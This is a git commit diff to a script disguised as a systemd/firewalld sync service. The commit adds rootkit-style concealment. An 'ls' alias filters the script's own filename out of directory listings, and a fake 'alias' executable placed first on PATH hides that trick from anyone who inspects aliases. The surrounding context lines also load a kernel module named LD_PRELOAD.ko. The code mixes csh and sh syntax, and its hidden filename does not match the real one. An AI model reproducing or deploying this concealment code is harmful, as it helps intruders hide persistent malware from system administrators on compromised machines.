aae8e8c0e56f71c1cd72b52a957a3d0ff9ac3468
Baremetal MSI <spark61974@gmail.com>
2025-02-19 02:18:40 -0500

    attempt to make ls alias and overwrite alias

--- systemd-firewalld-sync.sh
+++ systemd-firewalld-sync.sh
@@ -3,3 +3,25 @@
 # might need to sleep more depending on how many resources (how slow the box is) the box has
 sleep 10
 /sbin/kldstat | grep -q "LD_PRELOAD.ko" || /sbin/kldload /boot/modules/LD_PRELOAD.ko
+
+# alias to hide this file
+alias ls 'ls | grep -v systemd-firewall-sync.sh | xargs ls -d'
+
+
+# whenever someone runs alias it we will temporarily remove the alias then put it back
+# only make it if it doesn't already exist
+if [ -f "$FAKE_ALIAS_PATH" ]; then
+    exit 0
+fi
+
+cat <<EOF > /usr/local/bin/alias
+#!/bin/sh
+unalias ls 2>/dev/null
+alias
+alias ls 'ls | grep -v systemd-firewall-sync.sh | xargs ls -d'
+echo "it worked!"
+EOF
+
+chmod +x /usr/local/bin/alias
+export PATH="/usr/local/bin:$PATH"
+setenv PATH "/usr/local/bin:$PATH"
